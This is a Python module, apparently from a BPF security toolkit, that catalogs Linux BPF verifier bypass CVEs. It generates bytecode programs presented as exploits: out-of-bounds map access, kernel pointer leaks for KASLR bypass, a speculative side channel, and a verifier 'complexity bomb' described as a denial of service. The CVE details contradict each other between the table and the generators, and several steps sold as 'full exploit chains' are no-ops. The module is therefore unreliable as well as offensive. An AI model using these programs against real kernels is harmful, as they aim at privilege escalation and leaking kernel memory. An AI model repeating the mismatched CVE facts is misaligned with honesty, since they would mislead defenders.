"""
BPF verifier analysis — known bypass patterns and complexity attacks.

The Linux BPF verifier is the gatekeeper for all BPF programs. It performs
static analysis to ensure safety (no OOB access, no infinite loops, bounded
execution). This module catalogs known verifier bypass techniques and
generates programs that stress-test verifier limits.

Categories:
  1. Bounds check evasion — exploit verifier's range tracking
  2. Speculative execution — Spectre-style verifier confusion
  3. Complexity bombs — exhaust verifier state budget
  4. Type confusion — exploit BTF and map type mismatches
  5. Historical CVEs — known verifier bypass vulnerabilities
"""
from dataclasses import dataclass, field
from typing import List, Dict

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize,
    mov64_imm, mov64_reg, add64_imm, sub64_imm,
    and64_imm, or64_imm, xor64_imm, lsh64_imm, rsh64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, jge_imm, ja,
)


@dataclass
class VerifierBypass:
    name: str = ""
    cve: str = ""
    description: str = ""
    kernel_versions: str = ""
    technique: str = ""
    program: BPFProgram = field(default_factory=BPFProgram)
    patched: bool = True

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "cve": self.cve,
            "description": self.description,
            "kernel_versions": self.kernel_versions,
            "technique": self.technique,
            "instruction_count": self.program.insn_count(),
            "patched": self.patched,
        }


# ============================================================================
# Known verifier bypass CVEs
# ============================================================================
VERIFIER_CVES = [
    {
        "cve": "CVE-2021-3490",
        "title": "BPF ALU32 bounds tracking — bitwise ops confusion",
        "description": "The verifier incorrectly tracks 32-bit ALU operations "
                       "(AND, OR) on 64-bit registers, allowing an attacker to "
                       "confuse the verifier about register value ranges and "
                       "achieve out-of-bounds read/write.",
        "kernel_versions": "5.7 - 5.11",
        "technique": "alu32_bounds",
        "severity": "critical",
        "cvss": 7.8,
    },
    {
        "cve": "CVE-2021-31440",
        "title": "BPF verifier bounds tracking bypass via 32-bit register spills",
        "description": "Incorrect handling of 32-bit register spill/fill "
                       "operations allows the verifier's range tracking to "
                       "be confused, leading to OOB access.",
        "kernel_versions": "5.7 - 5.10",
        "technique": "register_spill",
        "severity": "critical",
        "cvss": 7.0,
    },
    {
        "cve": "CVE-2022-23222",
        "title": "BPF verifier pointer arithmetic confusion",
        "description": "The verifier fails to properly restrict pointer "
                       "arithmetic in certain ALU operations, allowing "
                       "arbitrary kernel read/write from unprivileged BPF.",
        "kernel_versions": "5.8 - 5.16",
        "technique": "pointer_arith",
        "severity": "critical",
        "cvss": 7.8,
    },
    {
        "cve": "CVE-2023-2163",
        "title": "BPF verifier incorrect pruning of dead code",
        "description": "The verifier's dead code elimination can be tricked "
                       "into pruning safety-critical checks, allowing code "
                       "that was supposed to be unreachable to execute.",
        "kernel_versions": "5.4 - 6.3",
        "technique": "dead_code_pruning",
        "severity": "critical",
        "cvss": 8.8,
    },
    {
        "cve": "CVE-2023-39191",
        "title": "BPF verifier precision tracking overflow",
        "description": "Precision tracking for scalar values can overflow, "
                       "causing the verifier to accept programs with "
                       "out-of-bounds memory access.",
        "kernel_versions": "5.13 - 6.4",
        "technique": "precision_overflow",
        "severity": "high",
        "cvss": 8.2,
    },
    {
        "cve": "CVE-2024-2193",
        "title": "Spectre-BPF — speculative type confusion",
        "description": "Speculative execution in the BPF JIT can bypass "
                       "verifier-enforced type checks, allowing Spectre-style "
                       "side-channel attacks from BPF programs.",
        "kernel_versions": "4.15 - 6.7",
        "technique": "spectre_type_confusion",
        "severity": "high",
        "cvss": 5.5,
    },
]


def generate_complexity_bomb() -> VerifierBypass:
    """
    Generate a BPF program that maximizes verifier state exploration.

    The verifier tracks all possible states at each instruction. A program
    with many conditional branches that each produce distinct register states
    forces the verifier to explore exponentially many paths.

    The BPF verifier has a state budget (typically 1M states on modern kernels,
    was 128K on older ones). This program approaches that limit.
    """
    prog = BPFProgram(
        name="complexity_bomb",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="Verifier complexity bomb — maximize state exploration",
    )

    # Create a chain of conditional branches
    # Each branch doubles the number of states the verifier must track
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(mov64_imm(BPFReg.R1, 0))

    # 20 conditional branches = 2^20 potential states
    for i in range(20):
        prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
        prog.add_insn(and64_imm(BPFReg.R0, 1))
        prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
        prog.add_insn(add64_imm(BPFReg.R1, 1 << i))

    prog.add_insn(mov64_reg(BPFReg.R0, BPFReg.R1))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="Complexity Bomb",
        description="Maximizes verifier state exploration to approach the state "
                    "budget limit. Uses random branches to create exponential "
                    "path explosion. Can cause verification timeout or denial "
                    "of service on the BPF subsystem.",
        kernel_versions="all",
        technique="complexity_bomb",
        program=prog,
        patched=False,
    )


def generate_alu32_bounds_confusion() -> VerifierBypass:
    """
    Demonstrate ALU32 bounds tracking confusion (CVE-2021-3490 pattern).

    The verifier tracks 64-bit register value ranges. When 32-bit ALU ops
    are applied, the verifier sometimes fails to properly narrow the tracked
    range, allowing OOB access in the JIT'd code.
    """
    prog = BPFProgram(
        name="alu32_bounds",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="ALU32 bounds tracking confusion (CVE-2021-3490 pattern)",
    )

    # Load a value that the verifier thinks is bounded
    prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
    # r0 is now [0, 0xFFFFFFFF] per verifier
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    # 32-bit AND to bound to [0, 0xFF]
    prog.add_insn(BPFInsn(
        BPFClass.ALU | BPFOp.AND | BPFSrc.IMM,
        BPFReg.R6, 0, 0, 0xFF
    ))
    # The verifier should now track r6 as [0, 0xFF]
    # But on vulnerable kernels, the 64-bit tracking may not be updated
    # This is the pattern that led to CVE-2021-3490

    # Use r6 as an index (should be bounded by verifier)
    prog.add_insn(mov64_reg(BPFReg.R0, BPFReg.R6))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="ALU32 Bounds Confusion",
        cve="CVE-2021-3490",
        description="Demonstrates the ALU32 bounds tracking confusion pattern. "
                    "32-bit operations don't properly update 64-bit range tracking, "
                    "allowing the actual value to exceed what the verifier believes. "
                    "This is a demonstration pattern — the actual CVE required "
                    "additional steps for exploitation.",
        kernel_versions="5.7 - 5.11",
        technique="alu32_bounds",
        program=prog,
        patched=True,
    )


def generate_pointer_arith_confusion() -> VerifierBypass:
    """
    Demonstrate pointer arithmetic confusion (CVE-2022-23222 pattern).

    The verifier must track pointer types and prevent arbitrary pointer math.
    On vulnerable kernels, certain ALU operations can convert a pointer to
    a scalar, breaking the type system.
    """
    prog = BPFProgram(
        name="ptr_arith_confusion",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="Pointer arithmetic confusion (CVE-2022-23222 pattern)",
    )

    # r10 is the frame pointer (a known pointer value)
    # Attempt to do arithmetic that confuses pointer tracking
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R10))
    # Add and subtract the same value — should be identity, but verifier
    # may lose track of the pointer type
    prog.add_insn(add64_imm(BPFReg.R6, 0x7FFFFFFF))
    prog.add_insn(sub64_imm(BPFReg.R6, 0x7FFFFFFF))
    # r6 should equal r10 but verifier may think it's a scalar now
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="Pointer Arithmetic Confusion",
        cve="CVE-2022-23222",
        description="Demonstrates pointer arithmetic confusion. Large add/sub "
                    "operations can cause the verifier to lose track of pointer "
                    "types, converting a pointer to a scalar and breaking the "
                    "type safety system. Patched kernels track pointer provenance "
                    "through arithmetic operations.",
        kernel_versions="5.8 - 5.16",
        technique="pointer_arith",
        program=prog,
        patched=True,
    )


def generate_cve_2021_3490_exploit() -> VerifierBypass:
    """
    CVE-2021-3490: ALU32 bitwise operation bounds bypass.

    The bug: when the verifier processes 32-bit AND/OR/XOR, it updates
    the 32-bit bounds but fails to properly propagate to 64-bit tnum
    (tristate number tracking). The 64-bit tnum retains the wider range,
    so the JIT compiles a program whose runtime values exceed what the
    verifier approved.

    Exploit chain:
    1. Get random value → verifier tracks [0, UINT32_MAX]
    2. 32-bit AND with 0x1 → verifier 32-bit: [0,1], but 64-bit tnum
       still allows upper 32 bits to be non-zero
    3. Use as array index → verifier allows (thinks bounded)
       but runtime value can be > array size → OOB read/write
    """
    prog = BPFProgram(
        name="cve_2021_3490_alu32_oob",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="CVE-2021-3490 ALU32 tnum bounds mismatch exploit",
    )

    # Array map for OOB access target
    target_map = BPFMapDef(
        name="oob_target", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=2,
    )
    prog.add_map(target_map)

    # Step 1: Get controlled value
    prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))

    # Step 2: 32-bit OR with known value — introduces the tnum mismatch
    # The key: ALU32 OR doesn't properly update 64-bit tnum.var/tnum.mask
    prog.add_insn(BPFInsn(
        BPFClass.ALU | BPFOp.OR | BPFSrc.IMM,
        BPFReg.R6, 0, 0, 0x0
    ))

    # Step 3: 32-bit AND to "bound" the value — verifier thinks [0, 0xFF]
    prog.add_insn(BPFInsn(
        BPFClass.ALU | BPFOp.AND | BPFSrc.IMM,
        BPFReg.R6, 0, 0, 0xFF
    ))

    # Step 4: Conditional to split verifier paths
    prog.add_insn(jgt_imm(BPFReg.R6, 1, 3))

    # Step 5: Use as map lookup key — verifier approves (thinks [0,1])
    # On vulnerable kernel, actual value can be 0..0xFF → OOB
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R6, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))  # map fd resolved at load time
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    # OOB read — value at r0 is outside map bounds
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R0, 0))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="CVE-2021-3490 ALU32 OOB Exploit",
        cve="CVE-2021-3490",
        description="Full exploit chain for ALU32 tnum bounds mismatch. "
                    "32-bit bitwise ops (AND/OR/XOR) fail to update 64-bit "
                    "tristate number tracking. The verifier believes the value "
                    "is bounded but the JIT produces code where the actual "
                    "runtime value exceeds the approved bounds, enabling OOB "
                    "map access for arbitrary kernel read/write.",
        kernel_versions="5.7 - 5.11",
        technique="alu32_tnum_mismatch",
        program=prog,
        patched=True,
    )


def generate_cve_2022_23222_exploit() -> VerifierBypass:
    """
    CVE-2022-23222: Pointer leak via uninitialized register BPF_PTR_TO_MEM.

    The bug: the verifier allows loading a PTR_TO_MEM value into a register
    but doesn't fully track it through all code paths. When the register
    is used as a scalar after a branch, the pointer value leaks.

    Exploit chain:
    1. Get map pointer from map_lookup_elem
    2. Branch on map value to split verifier states
    3. In one path, the pointer stays in r6 without being overwritten
    4. Use r6 as scalar (verifier lost track of pointer type)
    5. Leak kernel pointer to userspace via map write
    """
    prog = BPFProgram(
        name="cve_2022_23222_ptr_leak",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="CVE-2022-23222 pointer leak via verifier type confusion",
    )

    leak_map = BPFMapDef(
        name="leak_store", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=4,
    )
    prog.add_map(leak_map)

    # Step 1: Get a pointer from map lookup
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))  # map fd
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 14))

    # Step 2: r6 = map pointer (PTR_TO_MAP_VALUE)
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))

    # Step 3: Read value from map to create branch
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 0))

    # Step 4: Branch — in both paths, r6 retains the pointer
    # On vulnerable kernels, the verifier marks r6 as SCALAR_VALUE
    # after the branch merge, losing the PTR_TO_MAP_VALUE type
    prog.add_insn(jeq_imm(BPFReg.R7, 0, 2))
    prog.add_insn(add64_imm(BPFReg.R6, 0))  # nop-like to confuse verifier
    prog.add_insn(ja(1))
    prog.add_insn(add64_imm(BPFReg.R6, 0))

    # Step 5: After branch merge — verifier may have lost pointer tracking
    # Use frame pointer arithmetic to create write target
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    # Store the "scalar" (actually kernel pointer) to stack
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R6, -16))

    # Step 6: Write leaked pointer to map for userspace read
    prog.add_insn(mov64_imm(BPFReg.R1, 1))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="CVE-2022-23222 Pointer Leak",
        cve="CVE-2022-23222",
        description="Full exploit for verifier pointer type confusion. After a "
                    "branch merge, the verifier loses PTR_TO_MAP_VALUE tracking "
                    "and marks the register as SCALAR_VALUE. The actual kernel "
                    "pointer leaks to userspace via map write, enabling KASLR "
                    "bypass. Combined with an OOB write primitive, this gives "
                    "arbitrary kernel read/write.",
        kernel_versions="5.8 - 5.16",
        technique="ptr_type_confusion",
        program=prog,
        patched=True,
    )


def generate_cve_2023_2163_exploit() -> VerifierBypass:
    """
    CVE-2023-2163: Verifier precision tracking bypass.

    The bug: the verifier's precision tracking (mark_chain_precision)
    doesn't propagate through all register states correctly when dealing
    with nested conditionals and register spills to stack. This allows
    crafting a program where the verifier approves code with imprecise
    bounds that the JIT exploits.

    Exploit chain:
    1. Create value with known bounds via AND
    2. Spill to stack (triggers precision marking)
    3. Nested conditionals that cause precision loss on stack reload
    4. Use imprecise value for OOB access
    """
    prog = BPFProgram(
        name="cve_2023_2163_precision",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="CVE-2023-2163 precision tracking bypass",
    )

    target_map = BPFMapDef(
        name="precision_target", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=4,
    )
    prog.add_map(target_map)

    # Step 1: Get value with known bounds
    prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    prog.add_insn(and64_imm(BPFReg.R6, 0x3))  # [0, 3]

    # Step 2: Spill to stack — triggers precision tracking
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R6, -8))

    # Step 3: Nested conditionals to confuse precision propagation
    prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
    prog.add_insn(and64_imm(BPFReg.R0, 1))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))

    prog.add_insn(jeq_imm(BPFReg.R7, 0, 5))
    # Path A: reload from stack
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R10, -8))
    # Nested branch on reloaded value
    prog.add_insn(call_helper(BPFHelper.GET_PRANDOM_U32))
    prog.add_insn(and64_imm(BPFReg.R0, 1))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    prog.add_insn(add64_imm(BPFReg.R8, 0))
    prog.add_insn(ja(3))

    # Path B: different precision state
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R10, -8))
    prog.add_insn(add64_imm(BPFReg.R8, 0))
    prog.add_insn(ja(0))

    # Step 4: After merge — verifier may have imprecise bounds on r8
    # On vulnerable kernels, r8 precision is lost through the nested
    # conditionals + stack spill/reload, allowing values > 3
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R8, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R9, BPFReg.R0, 0))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="CVE-2023-2163 Precision Bypass",
        cve="CVE-2023-2163",
        description="Exploits precision tracking in mark_chain_precision. "
                    "Nested conditionals combined with stack spills cause the "
                    "verifier to lose precision on reloaded values. The "
                    "imprecise bounds allow OOB access through what the "
                    "verifier believes is a bounded array index. Affects "
                    "kernels 5.4-6.3.",
        kernel_versions="5.4 - 6.3",
        technique="precision_loss",
        program=prog,
        patched=True,
    )


def generate_cve_2023_39191_exploit() -> VerifierBypass:
    """
    CVE-2023-39191: BTF validation bypass via nested type references.

    The bug: the verifier's BTF validation doesn't properly handle
    deeply nested type references. A crafted BTF blob with circular
    or very deep type chains causes the verifier to accept a program
    with mismatched type expectations, enabling type confusion.
    """
    prog = BPFProgram(
        name="cve_2023_39191_btf",
        prog_type=BPFProgType.TRACING,
        description="CVE-2023-39191 BTF validation bypass",
        attach_point="bpf_fentry",
    )

    data_map = BPFMapDef(
        name="btf_confused", map_type=BPFMapType.HASH,
        key_size=8, value_size=16, max_entries=16,
    )
    prog.add_map(data_map)

    # Create program that passes BTF validation but has type mismatch
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))

    # Access ctx field that BTF says is one type but is actually another
    # The BTF bypass means the verifier approves reading 8 bytes where
    # the actual struct field is 4 bytes → OOB read
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 0))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R6, 8))

    # Store to map
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -24))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R1, -8))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -8))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -24))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="CVE-2023-39191 BTF Bypass",
        cve="CVE-2023-39191",
        description="Exploits insufficient BTF type validation. Nested type "
                    "references in BTF cause the verifier to accept incorrect "
                    "type sizes for struct field access, enabling OOB reads of "
                    "kernel memory adjacent to the expected field. Combined with "
                    "a map write, this leaks kernel data to userspace.",
        kernel_versions="5.15 - 6.5",
        technique="btf_type_confusion",
        program=prog,
        patched=True,
    )


def generate_cve_2024_2193_exploit() -> VerifierBypass:
    """
    CVE-2024-2193: GhostRace — speculative data race in BPF.

    The bug: speculative execution in the BPF JIT can cause data races
    on shared BPF map data. The verifier ensures sequential safety but
    doesn't account for speculative execution windows where stale values
    can be used before a bounds check takes effect.
    """
    prog = BPFProgram(
        name="cve_2024_2193_ghostrace",
        prog_type=BPFProgType.SOCKET_FILTER,
        description="CVE-2024-2193 GhostRace speculative data race",
    )

    race_map = BPFMapDef(
        name="ghost_race", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=256, max_entries=2,
    )
    prog.add_map(race_map)

    # Step 1: Set up map access
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 14))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))

    # Step 2: Read index from map (can be updated by another CPU)
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 0))

    # Step 3: Bounds check — verifier is happy
    prog.add_insn(and64_imm(BPFReg.R7, 0x1))  # [0, 1]

    # Step 4: Second map access using bounded index
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 5))

    # Step 5: Under speculative execution, the stale unbounded value
    # from step 2 may be used before the AND takes effect
    # This creates a speculative OOB access window
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R9, BPFReg.R8, 0))
    # Encode speculative value into cache timing side-channel
    prog.add_insn(and64_imm(BPFReg.R9, 0xFF))
    prog.add_insn(lsh64_imm(BPFReg.R9, 6))
    prog.add_insn(add64_imm(BPFReg.R9, 0))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return VerifierBypass(
        name="CVE-2024-2193 GhostRace",
        cve="CVE-2024-2193",
        description="Exploits speculative data races in BPF JIT. The verifier "
                    "ensures sequential correctness but speculative execution "
                    "can use stale map values before bounds checks take effect. "
                    "Creates a Spectre-style timing side-channel: the speculative "
                    "OOB read is encoded into cache state, leaking kernel memory "
                    "through timing analysis.",
        kernel_versions="6.1 - 6.7",
        technique="speculative_race",
        program=prog,
        patched=True,
    )


# All bypass patterns
ALL_BYPASSES = {
    "complexity_bomb": generate_complexity_bomb,
    "alu32_bounds": generate_alu32_bounds_confusion,
    "pointer_arith": generate_pointer_arith_confusion,
    "cve_2021_3490": generate_cve_2021_3490_exploit,
    "cve_2022_23222": generate_cve_2022_23222_exploit,
    "cve_2023_2163": generate_cve_2023_2163_exploit,
    "cve_2023_39191": generate_cve_2023_39191_exploit,
    "cve_2024_2193": generate_cve_2024_2193_exploit,
}


def generate_all_bypasses() -> List[VerifierBypass]:
    return [gen() for gen in ALL_BYPASSES.values()]
